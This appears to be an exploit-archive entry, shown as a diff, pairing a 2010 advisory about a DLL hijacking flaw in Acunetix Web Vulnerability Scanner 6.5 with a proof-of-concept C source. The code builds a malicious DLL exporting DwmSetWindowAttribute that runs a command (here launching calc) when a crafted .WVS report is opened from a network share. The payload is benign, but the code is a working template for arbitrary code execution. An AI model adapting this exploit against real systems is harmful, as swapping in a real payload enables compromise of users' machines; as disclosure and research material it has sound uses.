@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/42697/info
+
+Acunetix Web Vulnerability Scanner is prone to a vulnerability that lets attackers execute arbitrary code.
+
+An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.
+
+Acunetix Web Vulnerability Scanner 6.5.20100616 is vulnerable; other versions may also be affected. 
+
+// Exploit Title: Acunetix Web Vulnerability Scanner DLL Hijack
+// Date: 25 Aug 2010
+// Author: Kolor
+// Software Link: http://www.acunetix.com/vulnerability-scanner/vulnerabilityscanner65.exe
+// Version: 6.5.20100616
+// Tested on: Windows 7 64bit Eng
+// Vuln ext.: .WVS (saved report)
+
+#include <windows.h>
+#define DllExport __declspec (dllexport)
+DllExport void DwmSetWindowAttribute() { egg(); }
+
+int egg()
+{
+	system ("calc");
+		exit(0);
+		return 0;
+}
+
